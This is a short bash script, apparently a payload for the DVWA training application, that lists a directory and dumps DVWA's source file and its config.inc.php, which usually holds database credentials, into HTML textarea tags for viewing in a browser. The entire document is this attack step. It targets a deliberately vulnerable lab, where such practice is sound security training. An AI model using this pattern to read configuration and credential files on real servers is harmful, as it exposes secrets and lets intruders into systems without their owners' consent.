#!/bin/bash
ls -l ../
echo "<textarea cols='50'>"
cat ../view_source_all.php
echo "</textarea>"
echo "<textarea cols='50'>"
cat /var/www/html/dvwa/config/config.inc.php
echo "</textarea>"
